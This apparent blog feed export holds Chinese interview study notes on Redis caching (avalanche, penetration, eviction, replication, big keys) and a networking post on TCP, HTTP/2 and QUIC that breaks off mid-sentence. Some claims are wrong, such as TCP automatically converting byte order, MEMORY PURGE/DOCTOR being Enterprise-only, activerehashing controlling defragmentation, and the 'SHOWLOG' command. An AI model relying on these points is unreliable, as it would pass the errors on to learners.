href="#Redis缓存" class="headerlink" title="Redis缓存"></a>Redis缓存</h1><h2 id="介绍缓存雪崩，缓存击穿，缓存穿透"><a href="#介绍缓存雪崩，缓存击穿，缓存穿透" class="headerlink" title="介绍缓存雪崩，缓存击穿，缓存穿透"></a>介绍缓存雪崩，缓存击穿，缓存穿透</h2><ul><li><strong>缓存雪崩</strong> 指大量缓存数据在同一时间过期时，大量的用户请求全部直接访问数据库，从而导致数据库崩溃的问题，从而形成一系列连锁反应，造成整个系统崩溃。</li><li><strong>缓存击穿</strong> 指某个数据过期时，大量用户请求直接访问该数据，导致高并发的数据库请求</li><li><strong>缓存穿透</strong> 当用户访问的数据，既不在缓存中，也不在数据库中，导致请求在访问缓存时，发现缓存缺失，再去访问数据库时，发现数据库中也没有要访问的数据，没办法构建缓存数据，来服务后续的请求。那么当有大量这样的请求到来时，数据库的压力骤增，这就是缓存穿透的问题。</li></ul><p>【缓存雪崩解决方法】</p><ol><li>设置缓存失效时间随机打乱</li><li>设置缓存不过期，使用后台接口进行操作redis</li></ol><p>【缓存击穿解决方法】</p><ol><li>互斥锁方案（Redis 中使用 setNX 方法设置一个状态位，表示这是一种锁定状态），保证同一时间只有一个业务线程请求缓存，未能获取互斥锁的请求，要么等待锁释放后重新读取缓存，要么就返回空值或者默认值。</li><li>不给热点数据设置过期时间，由后台异步更新缓存，或者在热点数据准备要过期前，提前通知后台线程更新缓存以及重新设置过期时间；</li></ol><p>【缓存穿透解决方法】</p><ol><li><p><strong>布隆过滤器</strong>：快速判断数据是否存在，避免通过查询数据库来判断数据是否存在：我们可以在写入数据库数据时，使用布隆过滤器做个标记，然后在用户请求到来时，业务线程确认缓存失效后，可以通过查询布隆过滤器快速判断数据是否存在，如果不存在，就不用通过查询数据库来判断数据是否存在，即使发生了缓存穿透，大量请求只会查询 Redis 和布隆过滤器，而不会查询数据库，保证了数据库能正常运行，Redis 自身也是支持布隆过滤器的。</p></li><li><p>设置空值或者默认值</p></li><li><p>在API入口处判断请求参数有没有非法值/是否存在</p></li></ol><h2 id="热点数据缓存策略"><a href="#热点数据缓存策略" class="headerlink" title="热点数据缓存策略"></a>热点数据缓存策略</h2><p>热点数据动态缓存的策略总体思路：通过数据最新访问时间来做排名，并过滤掉不常访问的数据，只留下经常访问的数据。</p><h2 id="【面试题】缓存更新策略"><a href="#【面试题】缓存更新策略" class="headerlink" title="【面试题】缓存更新策略"></a>【面试题】缓存更新策略</h2><ul><li>Cache Aside（旁路缓存）策略；</li><li>Read/Write Through（读穿 / 写穿）策略；</li><li>Write Back（写回）策略；</li></ul><h2 id="【面试题】数据库和缓存如何保证一致性"><a href="#【面试题】数据库和缓存如何保证一致性" class="headerlink" title="【面试题】数据库和缓存如何保证一致性"></a>【面试题】数据库和缓存如何保证一致性</h2><h2 id="【面试题】常见性能问题和解决方案"><a href="#【面试题】常见性能问题和解决方案" class="headerlink" title="【面试题】常见性能问题和解决方案"></a>【面试题】常见性能问题和解决方案</h2><ol><li>Master 最好不要写内存快照，如果 Master 写内存快照，save 命令调度 rdbSave 函数，会阻塞主线程的工作，当快照比较大时对性能影响是非常大 的，会间断性暂停服务</li><li>如果数据比较重要，某个 Slave 开启 AOF 备份数据，策略设置为每秒同步一次</li><li>为了主从复制的速度和连接的稳定性，Master 和 Slave 最好在同一个局 域网</li><li>尽量避免在压力很大的主库上增加从</li><li>主从复制不要用图状结构，用单向链表结构更为稳定，即:Master &lt;- Slave1&lt;- Slave2 &lt;- Slave3… 这样的结构方便解决单点故障问题，实现 Slave 对 Master 的替换。如果 Master 挂了，可以立刻启 用 Slave1 做 Master，其他不变。</li></ol><h2 id="过期key的删除策略"><a href="#过期key的删除策略" class="headerlink" title="过期key的删除策略"></a>过期key的删除策略</h2><ul><li>定时删除单key：一个是添加的key的时候， expire指定时间</li><li>惰性删除：每次查找key时，都会判断是否过期</li><li>定期批量删除：每隔一段时间扫库，删除过期key<h2 id="Redis回收-淘汰策略"><a href="#Redis回收-淘汰策略" class="headerlink" title="Redis回收/淘汰策略"></a>Redis回收/淘汰策略</h2></li></ul><ol><li>volatile-lru:从已设置过期时间的数据集(server.db[i].expires)中挑选 最近最少使用的数据淘汰</li><li>volatile-ttl:从已设置过期时间的数据集(server.db[i].expires)中挑选 将要过期的数据淘汰</li><li>volatile-random:从已设置过期时间的数据集(server.db[i].expires)中任 意选择数据淘汰</li><li>allkeys-lru:从数据集(server.db[i].dict)中挑选最近最少使用的数据淘 汰</li><li>allkeys-random:从数据集(server.db[i].dict)中任意选择数据淘汰</li><li>no-enviction(驱逐):禁止驱逐数据 注意这里的 6 种机制，volatile 和 allkeys 规定了是对已设置 过期时间的数 据集淘汰数据还是从全部数据集淘汰数据，后面的 lru、ttl 以及 random 是 三种不同 的淘汰策略，再加上一种no-enviction 永不回收的策略。<h2 id="如何选取上述策略？"><a href="#如何选取上述策略？" class="headerlink" title="如何选取上述策略？"></a>如何选取上述策略？</h2></li><li>如果数据分布的差不多，使用allkeys random</li><li>如果数据分布差别大，使用allkeys lru<h2 id="redis的同步机制是什么【全量复制和部分复制】"><a href="#redis的同步机制是什么【全量复制和部分复制】" class="headerlink" title="redis的同步机制是什么【全量复制和部分复制】"></a>redis的同步机制是什么【全量复制和部分复制】</h2></li></ol><ul><li>salve 发送sync请求到master，开始第一次同步</li><li>第一次同步时使用bgsave做rdb快照，同时将后续修改记录加到内存缓冲区，完成后将rdb文件同步到从节点，复制完后由从节点加载到内存</li><li>加载完成后通知master，master将缓冲区的写操作记录发给slave，slave再执行剩余的这些写操作，与master保持一致<h3 id="部分复制"><a href="#部分复制" class="headerlink" title="部分复制"></a>部分复制</h3></li><li>slave发送psync请求到master，开始第一次同步</li><li>slave再发一个偏移量，master从这个偏移量开始同步数据<h2 id="redis集群的原理"><a href="#redis集群的原理" class="headerlink" title="redis集群的原理"></a>redis集群的原理</h2></li></ul><ol><li><p>哨兵模式，高可用性，在master宕机时自动将slave提升为master</p></li><li><p>集群模式，扩展性，单个redis内存不足时，使用cluster进行分片存储</p><ul><li>集群没用一致性hash，而是用了hash槽，有16384个hash槽，每个节点负责一部分槽</li><li>主从复制模型，每个节点都是其他节点的副本<h2 id="集群会有写操作丢失吗【会】为什么？"><a href="#集群会有写操作丢失吗【会】为什么？" class="headerlink" title="集群会有写操作丢失吗【会】为什么？"></a>集群会有写操作丢失吗【会】为什么？</h2></li></ul></li><li><p>当发生故障转移（failover）时，在连接丢失的情况下，部分写操作无法完成</p></li><li><p>另外如果用了RDB，主节点写操作存在buffer里，转移主节点时，这部分不进行复制，导致写操作丢失，所以可以使用混合方式，写操作使用AOF持久化一下，转移主节点后重放AOF日志</p><h2 id="redis事务了解吗"><a href="#redis事务了解吗" class="headerlink" title="redis事务了解吗"></a>redis事务了解吗</h2><p>multi exec discard watch</p><h2 id="如何优化redis内存占用和性能【内存优化】"><a href="#如何优化redis内存占用和性能【内存优化】" class="headerlink" title="如何优化redis内存占用和性能【内存优化】"></a>如何优化redis内存占用和性能【内存优化】</h2></li><li><p>对小数据合并到一个对象中，用hash存储</p></li><li><p>设置合理的过期策略，和内存淘汰策略等</p></li><li><p>使用持久化保证高可用性</p></li><li><p>使用布隆过滤器，防止缓存穿透和击穿问题，查看一个元素是否存在于一个集合中</p></li><li><p>删除key后的碎片整理：Redis 会在删除键值对后，释放内存并且尝试整理内存碎片。可以通过配置文件中的 activerehashing 参数来控制内存碎片整理的行为。</p><h2 id="假如-Redis-里面有-1-亿个-key，其中有-10w-个-key-是以某-个固定的已知的前缀开头的，如果将它们全部找出来"><a href="#假如-Redis-里面有-1-亿个-key，其中有-10w-个-key-是以某-个固定的已知的前缀开头的，如果将它们全部找出来" class="headerlink" title="假如 Redis 里面有 1 亿个 key，其中有 10w 个 key 是以某 个固定的已知的前缀开头的，如果将它们全部找出来?"></a>假如 Redis 里面有 1 亿个 key，其中有 10w 个 key 是以某 个固定的已知的前缀开头的，如果将它们全部找出来?</h2></li></ol><ul><li>使用scan无阻塞地去提取正则字符串，然后在客户端用一个set去重</li><li>keys也可以扫，但是会导致阻塞，线上服务会停<h2 id="redis队列和延时队列"><a href="#redis队列和延时队列" class="headerlink" title="redis队列和延时队列"></a>redis队列和延时队列</h2></li><li>队列使用list，当队列为空，rpush生产消息，使用blpop消费消息。</li><li>延时队列使用zset，每个消息对应的时间戳作为score，消息内容当key，<strong>zadd生产消息</strong>，消费者用 <strong>zrangebyscore 指令获取 N 秒之前的数据轮询进行处理</strong></li></ul><h2 id="redis内存回收进程"><a href="#redis内存回收进程" class="headerlink" title="redis内存回收进程"></a>redis内存回收进程</h2><p><a href="https://cloud.tencent.com/developer/article/2315748" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/2315748</a><br>Redis回收进程指对那些已过期但是尚未被删除的 keys 进行标记，这样它们就可以在之后被立即释放并回收所占用的内存</p><ol><li>基本原理是周期性地扫描存储数据库中所有的键<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Redis 提供了三个与内存回收相关的命令：</span><br><span class="line"></span><br><span class="line">MEMORY USAGE key：</span><br><span class="line">用于返回指定键所占用的内存字节数。可以通过传递键的名称作为参数来获取相应键的内存使用情况。</span><br><span class="line">MEMORY PURGE：</span><br><span class="line">该命令用于在 Redis Enterprise 中手动触发内存回收。</span><br><span class="line">MEMORY DOCTOR：</span><br><span class="line">该命令用于诊断 Redis 内存分配和使用情况，帮助识别内存泄漏或者不正常的内存使用情况。</span><br><span class="line">需要注意的是，MEMORY PURGE 和 MEMORY DOCTOR 是 Redis Enterprise 特有的命令，而 MEMORY USAGE 是 Redis 通用的命令。</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何使用redis实现一个分布式锁"><a href="#如何使用redis实现一个分布式锁" class="headerlink" title="如何使用redis实现一个分布式锁"></a>如何使用redis实现一个分布式锁</h2><ul><li>setnx拿锁，拿到之后expire给锁加一个过期时间，</li></ul><h2 id="Redis内存耗尽会怎样"><a href="#Redis内存耗尽会怎样" class="headerlink" title="Redis内存耗尽会怎样"></a>Redis内存耗尽会怎样</h2><p>崩溃，可能导致缓存失效，命中率下降，虚拟内存<br><a href="https://juejin.cn/post/6932711444404256781" target="_blank" rel="noopener">https://juejin.cn/post/6932711444404256781</a></p><ol><li>会使用LRU和LFU的内存淘汰策略<h2 id="LRU-最近最长时间未被使用"><a href="#LRU-最近最长时间未被使用" class="headerlink" title="LRU 最近最长时间未被使用"></a>LRU 最近最长时间未被使用</h2><h2 id="LFU-最近最少频率使用"><a href="#LFU-最近最少频率使用" class="headerlink" title="LFU 最近最少频率使用"></a>LFU 最近最少频率使用</h2></li></ol><h2 id="stream数据结构"><a href="#stream数据结构" class="headerlink" title="stream数据结构"></a>stream数据结构</h2><ol><li>基于基数树</li></ol><h2 id="缓存穿透miss-和击穿breakdown-怎么解决"><a href="#缓存穿透miss-和击穿breakdown-怎么解决" class="headerlink" title="缓存穿透miss 和击穿breakdown 怎么解决"></a>缓存穿透miss 和击穿breakdown 怎么解决</h2><ul><li>击穿是breakdown，要查找的热点缓存突然过期，导致大量请求向mysql涌入，导致崩溃等问题</li><li>穿透是缓存中没有这些key，没有方法满足这些请求<h2 id="穿透的解决方式"><a href="#穿透的解决方式" class="headerlink" title="穿透的解决方式"></a>穿透的解决方式</h2></li></ul><ol><li>在缓存之前再加一层布隆过滤器，在查询的时候先去布隆过滤器查询 key 是否存在，如果不存在就直接返回</li><li>简单处理，存无效key，value设为null</li></ol><h2 id="如果有大量的key需要同一时间过期，要如何解决缓存雪崩问题"><a href="#如果有大量的key需要同一时间过期，要如何解决缓存雪崩问题" class="headerlink" title="如果有大量的key需要同一时间过期，要如何解决缓存雪崩问题"></a>如果有大量的key需要同一时间过期，要如何解决缓存雪崩问题</h2><ul><li>设置过期时间时加上随机值，使得缓存失效的时间点尽量均匀分布。</li><li>使用 Redis 集群，将缓存数据分散到多个节点上，避免单点故障。</li><li>在缓存失效后采用加锁或者队列来控制<strong>读数据库写缓存</strong>的线程数量，避免大量线程同时读数据库。</li><li>针对热点数据可以设置永不过期，或者使用手动过期的方式来控制缓存的使用时间</li><li>高并发时，使用限流和熔断机制控制请求访问量</li><li>本地和分布式缓存结合，服务器本地当二级缓存</li></ul><h2 id="热key问题怎么解决"><a href="#热key问题怎么解决" class="headerlink" title="热key问题怎么解决"></a>热key问题怎么解决</h2><p>热key问题是由于某部分热点key分布在不同的节点上，导致负载不均衡</p><ul><li>解决方法，1使用分布式缓存，读写分离架构 2 数据分片策略 3 缓存失效策略避免一直是热key</li><li>如果热Key的产生<strong>来自于读请求</strong>使用读写分离架构<br>您可以将实例改造成读写分离架构来降低每个数据分片的读请求压力，甚至可以不断地增加从节点。但是读写分离架构在增加业务代码复杂度的同时，也会增加Redis集群架构复杂度。不仅要为多个从节点提供转发层（如Proxy，LVS等）来实现负载均衡，还要考虑从节点数量显著增加后带来故障率增加的问题。<h2 id="单例的redis能承载多少个连接？【默认1w个，可以用maxclients修改】"><a href="#单例的redis能承载多少个连接？【默认1w个，可以用maxclients修改】" class="headerlink" title="单例的redis能承载多少个连接？【默认1w个，可以用maxclients修改】"></a>单例的redis能承载多少个连接？【默认1w个，可以用maxclients修改】</h2></li></ul><h2 id="redis-6-0-前后不支持与支持多线程的理由"><a href="#redis-6-0-前后不支持与支持多线程的理由" class="headerlink" title="redis 6.0 前后不支持与支持多线程的理由"></a>redis 6.0 前后不支持与支持多线程的理由</h2><ol><li>6.0前，避免竞态条件，上下文切换的开销，充分利用CPU</li><li>6.0后的多线程主要引入的是IO和AOF和RDB备份</li></ol><h2 id="提高命中率的方式"><a href="#提高命中率的方式" class="headerlink" title="提高命中率的方式"></a>提高命中率的方式</h2><ol><li>缓存过期时间</li><li>缓存预热</li><li>LRU LFU分别基于访问时间和频率来确定缓存中的数据</li><li>使用分布式缓存，将缓存数据分布到多节点上<!-- 5. 使用分布式锁，布隆过滤器等手段去提高可用性，提供维护时间长 --></li></ol><h2 id="redis-如何解决key冲突"><a href="#redis-如何解决key冲突" class="headerlink" title="redis 如何解决key冲突"></a>redis 如何解决key冲突</h2><ol><li><p>命名时注意不冲突，比如加前缀后缀</p></li><li><p>不同数据存合适的数据结构</p></li><li><p>分布式锁来保证并发冲突</p></li><li><p>单线程下使用mutex方法<br>内存模型是hashtable，解决key冲突可能就链地址 开地址哪些吧</p></li></ol><h2 id="redis-如何解决大key问题【key的value过大】"><a href="#redis-如何解决大key问题【key的value过大】" class="headerlink" title="redis 如何解决大key问题【key的value过大】"></a>redis 如何解决大key问题【key的value过大】</h2><p><a href="https://help.aliyun.com/zh/redis/user-guide/identify-and-handle-large-keys-and-hotkeys" target="_blank" rel="noopener">bigkey solution</a></p><h3 id="大key产生的问题"><a href="#大key产生的问题" class="headerlink" title="大key产生的问题"></a>大key产生的问题</h3><ol><li>执行变慢，删除时产生阻塞，内存溢出</li></ol><h3 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h3><ol><li>如果已经发现了一个大key，就遍历把它插成大key1 key2 key3，限制长度</li><li>不要这个大key时，使用UNLINK删除</li><li><strong>使用redis分片技术</strong>：</li></ol><ul><li><p>一致性hash:<br>将哈希值映射到一个固定大小的环形空间中。客户端根据键的哈希值定位到环上的某个位置，然后找到离该位置最近的节点，将数据存储在该节点上。</p><ul><li><strong>优点</strong>：在节点的增减时，只有少量的数据需要重新映射，保持了相对的稳定性。</li><li><strong>缺点</strong>：可能会出现不均匀的数据分布，导致节点负载不均</li></ul></li><li><p>CRC16:<br>循环冗余校验来生成哈希值</p><ul><li><strong>优点</strong>：计算速度快，适用于一些简单的分布式场景。</li><li><strong>缺点</strong>：可能会导致节点负载不均衡。</li></ul></li><li><p>RedisCluster<br>它将数据分片到多个节点上，同时提供了节点间的数据复制和故障恢复机制</p><ul><li><strong>优点</strong>自动进行数据分片和复制，实现了高可用性。</li><li><strong>缺点</strong>好用但是复杂 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Key本身的数据量过大：一个String类型的Key，它的值为5 MB。</span><br><span class="line">Key中的成员数过多：一个ZSET类型的Key，它的成员数量为10,000个。</span><br><span class="line">Key中成员的数据量过大：一个Hash类型的Key，它的成员数量虽然只有1,000个但这些成员的Value（值）总大小为100 MB。</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="redis慢查询如何排查"><a href="#redis慢查询如何排查" class="headerlink" title="redis慢查询如何排查"></a>redis慢查询如何排查</h2><p>命令：</p><ol><li>慢查询日志：SHOWLOG GET</li><li>redis-cli的INFO</li><li>redis有一个时延监控命令，–latency查询命令</li></ol>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NetWorking</title>
      <link href="/2023/01/04/2023-01-04-%E9%9D%A2%E7%BB%8F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2023/01/04/2023-01-04-%E9%9D%A2%E7%BB%8F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h1 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h1><p>MAC头部：6<br>IP头部：20<br>TCP头部：20到60字节<br>UDP头部：8<br>TCP最大长度 65535 - 头部</p><p>UDP最大长度 65535 - 头部</p><h2 id="TCP的字节序是大端还是小端【大端】为什么？"><a href="#TCP的字节序是大端还是小端【大端】为什么？" class="headerlink" title="TCP的字节序是大端还是小端【大端】为什么？"></a>TCP的字节序是大端还是小端【大端】为什么？</h2><p>小端字节序是将最低有效字节存储在内存的最低地址处，而大端字节序则是将最高有效字节存储在最低地址处。</p><ol><li>网络字节序是大端，arm64和x86主机采用主机字节序，是小端</li><li>如果两台主机的CPU架构或者字节序不同（比如一台是小端序，另一台是大端序），TCP协议会在传输过程中自动进行字节序的转换，以保证接收方能够正确地解析数据。</li></ol><ul><li>创建socket或bind时，要用htonl、htons等函数来将端口或ip地址从主机字节序转换成网络字节序</li><li>send，recv等函数传输的只是字节流，不关心大小端序<h2 id="TCP如何保证可靠的"><a href="#TCP如何保证可靠的" class="headerlink" title="TCP如何保证可靠的"></a>TCP如何保证可靠的</h2></li></ul><ol><li>确认号，序列号</li><li>三次握手和四次挥手</li><li>超时重传（TTS字段）</li><li>流量控制（滑动窗口）</li><li>拥塞控制（拥塞窗口）<h2 id="TCP半连接队列和全连接队列"><a href="#TCP半连接队列和全连接队列" class="headerlink" title="TCP半连接队列和全连接队列"></a>TCP半连接队列和全连接队列</h2>在TCP连接的建立过程中，会涉及到半连接队列（SYN队列）和全连接队列（ESTABLISHED队列）。</li></ol><ul><li>半连接队列中存放的是三次握手中的第一步（即SYN）发送的连接请求，还没有得到完全建立连接的确认</li><li>当TCP连接成功建立后，会被移动到全连接队列<h2 id="粘包和拆包"><a href="#粘包和拆包" class="headerlink" title="粘包和拆包"></a>粘包和拆包</h2>由于网络传输中的数据分片、路由器缓冲区大小限制、接收端缓冲区大小设置等因素造成的</li><li><strong>粘包</strong>：多个数据包被合并成一个大的数据块</li><li><strong>拆包</strong>：只收到了一个大包，被拆成了多个小块</li><li>TCP选项字段可以设置MTU，指网络通信中能够通过的最大数据包的大小。通过设置MTU，可以控制单个数据包的大小，但并不能解决粘包和拆包的问题。</li><li>粘包和拆包问题主要是因为TCP协议是流协议，它并没有记录消息的边界信息。因此，在数据传输过程中，可能会出现多个消息被合并成一个包（粘包）或一个消息被拆分成多个包（拆包）的情况。<h1 id="TCP最大长度为2的32次方-头部字段"><a href="#TCP最大长度为2的32次方-头部字段" class="headerlink" title="TCP最大长度为2的32次方-头部字段"></a>TCP最大长度为2的32次方-头部字段</h1><h3 id="解决办法【固定长度，消息边界，定时器，缓冲区】"><a href="#解决办法【固定长度，消息边界，定时器，缓冲区】" class="headerlink" title="解决办法【固定长度，消息边界，定时器，缓冲区】"></a>解决办法【固定长度，消息边界，定时器，缓冲区】</h3></li></ul><ol><li>头部字段，固定消息长度</li><li>帧数据字段加入边界信息，比如某个特定字符</li><li>使用定时器来等待足够长的时间以接收完整的消息，</li><li>可以通过合理设置缓冲区大小来保证完整接收消息<h2 id="TCP的TIMEWAIT状态过多会发生什么"><a href="#TCP的TIMEWAIT状态过多会发生什么" class="headerlink" title="TCP的TIMEWAIT状态过多会发生什么"></a>TCP的TIMEWAIT状态过多会发生什么</h2>TCP的TIME_WAIT状态发生在第四次挥手，是为了确保在网络中所有的数据包都被正确地接收和处理，以避免出现数据包混淆或丢失的情况</li><li>内存资源、端口资源大量被占用，新连接无法建立，被网络攻击，导致程序崩溃等情况</li><li>拒绝服务（DOS）攻击，端口扫描攻击<h3 id="【如何解决】"><a href="#【如何解决】" class="headerlink" title="【如何解决】"></a>【如何解决】</h3></li><li>在程序里设置一个等待参数，超时退出</li><li>使用连接池复用连接<h2 id="传输内容"><a href="#传输内容" class="headerlink" title="传输内容"></a>传输内容</h2>应用层 报文<br>传输层 报文段<br>网络层 数据包<br>链路层 数据帧<br>物理层 比特流<h2 id="网络层实现转发"><a href="#网络层实现转发" class="headerlink" title="网络层实现转发"></a>网络层实现转发</h2><h2 id="路由表是使用什么数据结构查找的？路由表中没有要查找的IP怎么办？"><a href="#路由表是使用什么数据结构查找的？路由表中没有要查找的IP怎么办？" class="headerlink" title="路由表是使用什么数据结构查找的？路由表中没有要查找的IP怎么办？"></a>路由表是使用什么数据结构查找的？路由表中没有要查找的IP怎么办？</h2>路由表通常使用前缀树（Trie）存储路由表项，存的是一个<strong>IP地址与下一跳路由器，即路由器的IP地址</strong>，的映射<br>没有要查找的IP，则跳到默认的下一跳，如果一直转发默认下一跳，则丢弃或者不可达信号</li></ol><h2 id="简述TCP的拥塞控制"><a href="#简述TCP的拥塞控制" class="headerlink" title="简述TCP的拥塞控制"></a>简述TCP的拥塞控制</h2><p>首先，通过<strong>慢启动</strong>机制，当建立新的TCP连接时，发送方会谨慎地开始发送数据，逐步增大发送量以避免过快发送引起网络拥塞，每次x2。其次，一旦拥塞窗口达到设定阈值，TCP进入<strong>拥塞避免</strong>状态，发送方将<strong>以线性方式增大拥塞窗口</strong>，以保持合理的数据传输速率。</p><ol><li>发现数据丢失时，用<strong>快速重传和快速恢复机制</strong>：1.计时器检测没有确认，超时重传发生，TCP会将拥塞窗口减半，再线性增加。<h2 id="简述TCP的流量控制【确保接收方能以自己的接收速度来处理】"><a href="#简述TCP的流量控制【确保接收方能以自己的接收速度来处理】" class="headerlink" title="简述TCP的流量控制【确保接收方能以自己的接收速度来处理】"></a>简述TCP的流量控制【确保接收方能以自己的接收速度来处理】</h2>通过接收方维护接收的窗口实现的。<br>发送方<h1 id="1-应用层"><a href="#1-应用层" class="headerlink" title="1. 应用层"></a>1. 应用层</h1><h2 id="HTTP的无状态、明文传输特性"><a href="#HTTP的无状态、明文传输特性" class="headerlink" title="HTTP的无状态、明文传输特性"></a>HTTP的无状态、明文传输特性</h2></li></ol><ul><li>无状态：在处理每个请求时都不会记住之前的请求，每个请求都是独立的，不依赖于之前的请求</li><li>状态码：状态码用来指示<strong>服务器对请求</strong>的处理状态<h2 id="HTTP缓存"><a href="#HTTP缓存" class="headerlink" title="HTTP缓存"></a>HTTP缓存</h2></li><li>强制缓存：浏览器判断缓存没有过期，则直接使用浏览器的本地缓存</li><li>协商缓存：通过服务端告知客户端是否可以使用缓存的方式被称为协商缓存，响应状态码为304。</li><li>【TIP】只有在未能命中强制缓存的时候，才能发起带有协商缓存字段的请求。</li></ul><h2 id="HTTP-和HTTPs-的区别"><a href="#HTTP-和HTTPs-的区别" class="headerlink" title="HTTP 和HTTPs 的区别"></a>HTTP 和HTTPs 的区别</h2><ol><li>HTTP是明文传输，HTTPS使用了SSL证书来建立加密传输过程，HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。</li><li>HTTP是直接运行在TCP协议基础上的，HTTPS是运行在SSL协议上，其中SSL协议建立在TCP之上，使用加密和身份验证保证安全性</li><li>HTTPS 在 TCP 三次握手之后，还需进行 SSL/TLS 的握手过程，才可进入加密报文传输。</li><li>CA证书放在服务器上，证书内容包含服务器的公钥、持有者信息、颁发者信息、有效期等等</li><li>CA证书验证：服务器向客户端发送证书时，客户端会使用相应的CA的公钥来验证证书的合法性。包括检查证书的数字签名是否正确、证书是否在有效期内等。</li><li>CA信任链验证：如果客户端信任该CA（通常是因为<strong>CA的根证书</strong>预装在操作系统或浏览器中），那么客户端将信任由该CA签发的证书。</li></ol><h2 id="HTTP状态码目录"><a href="#HTTP状态码目录" class="headerlink" title="HTTP状态码目录"></a>HTTP状态码目录</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Status</a></p><ul><li>200：成功返回响应</li><li>301：永久重定向，客户端第一次访问此 url 时，告知客户端以后直接访问新的 url，该状态保存在浏览器缓存中。</li><li>302；临时重定向，客户端每次访问此 url 时，告知客户端重定向到新的 url ，后续访问依然访问当前的 url。</li><li>304：使用协商缓存</li><li>400：发送的请求错误，请求格式错误，或者没有服务器要求的数据。</li><li>401：没有权限访问，当前用户没有权限访问此资源。</li><li>403：请求被服务器禁止。</li><li>404：请求的 url 不存在，一般是 url 出错。</li><li>500：服务器处理请求出现错误。</li><li>501：服务器超出能力之外的方法，例如：请求的方法服务器不支持。</li><li>504：来自网关或者代理服务器，请求资源服务器时超时。</li></ul><h2 id="HTTP2：解决HTTP延迟高的问题"><a href="#HTTP2：解决HTTP延迟高的问题" class="headerlink" title="HTTP2：解决HTTP延迟高的问题"></a>HTTP2：解决HTTP延迟高的问题</h2><ul><li>延迟高的原因：请求-响应模型、头部巨大且重复、并发连接耗时、服务器不能主动推送等<h3 id="解决方法与针对的问题"><a href="#解决方法与针对的问题" class="headerlink" title="解决方法与针对的问题"></a>解决方法与针对的问题</h3></li><li>头部压缩：Cookie、User Agent、Accept 头部字段内容太大</li><li>二进制帧：字段传输速度，便于位运算</li><li>并发传输：缓解了队头阻塞问题（没有解决）</li><li>服务端主动推送资源<h3 id="方法细节"><a href="#方法细节" class="headerlink" title="方法细节"></a>方法细节</h3></li><li>头部压缩：使用Hpack算法，静态字典/动态字典/哈夫曼编码。客户端和服务器两端都会建立和维护「字典」，用长度较小的索引号表示重复的字符串，再用 Huffman 编码压缩数据，可达到 50%~90% 的高压缩率。</li><li>二进制帧：响应报文划分成了两类帧，包括 首部 和 DATA（负载），也就是说一条 HTTP 响应，划分成了两类帧来传输，并且采用二进制来编码。</li><li>并发传输：使用 Stream 设计，多个 Stream 复用一条 TCP 连接，达到并发的效果</li></ul><p><img src="/images/http2stream.webp" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 1 个 TCP 连接包含一个或者多个 Stream，Stream 是 HTTP/2 并发的关键技术；</span><br><span class="line">- Stream 里可以包含 1 个或多个 Message，Message 对应 HTTP/1 中的请求或响应，由 HTTP 头部和包体构成；</span><br><span class="line">- Message 里包含一条或者多个 Frame，Frame 是 HTTP/2 最小单位，以二进制压缩格式存放 HTTP/1 中的内容（头部和包体）；</span><br><span class="line">- 一个 Frame 可以由多个 TCP 报文构成</span><br><span class="line">- 不同stream的帧可以乱序，帧头部可以带stream ID，接收端可以重组</span><br></pre></td></tr></table></figure><ul><li>服务端推送资源：客户端发起的请求，必须使用的是奇数号 Stream，服务器主动的推送，使用的是偶数号 Stream。服务器在推送资源时，会通过 PUSH_PROMISE 帧传输 HTTP 头部，并通过帧中的 Promised Stream ID 字段告知客户端，接下来会在哪个偶数号 Stream 中发送包体。<h2 id="HTTP3-quic协议，使用HTTP2-TLS-UDP"><a href="#HTTP3-quic协议，使用HTTP2-TLS-UDP" class="headerlink" title="HTTP3: quic协议，使用HTTP2 + TLS + UDP"></a>HTTP3: quic协议，使用HTTP2 + TLS + UDP</h2>HTTP2存在问题：</li></ul><ol><li>TCP层的队头阻塞问题：HTTP/2 多个请求是跑在一个 TCP 连接中的，那么当 TCP 丢包时，整个 TCP 都要等待重传，那么就会阻塞该 TCP 连接中的所有请求。<ul><li><strong>TCP 是字节流协议</strong>。TCP 层必须保证收到的字节数据是完整且有序的，如果序列号较低的 TCP 段在网络传输中丢失了，即使序列号较高的 TCP 段已经被接收了，应用层也无法从内核中读取到这部分数据，从 HTTP 视角看，就是请求被阻塞了。</li></ul></li><li>TCP 与 TLS 的握手时延迟：TCP 由于具有「拥塞控制」的特性，所以刚建立连接的 TCP 会有个「慢启动」的过程，它会对 TCP 连接产生“减速”效果</li><li>网络迁移需要重新连接：<h3 id="quic协议"><a href="#quic协议" class="headerlink" title="quic协议"></a>quic协议</h3></li><li>无队头阻塞：传输层协议换成UDP，根本上避免了TCP的队头阻塞。<ul><li>quic协议会保证数据包的可靠性，每个数据包都有一个序号唯一标识。当某个流中的一个数据包丢失了，即使该流的其他数据包到达了，数据也无法被 HTTP/3 读取，直到 QUIC 重传丢失的报文，数据才会交给 HTTP/3。</li><li>而其他流的数据报文只要被完整接收，HTTP/3 就可以读取到数据。这与 HTTP/2 不同，HTTP/2 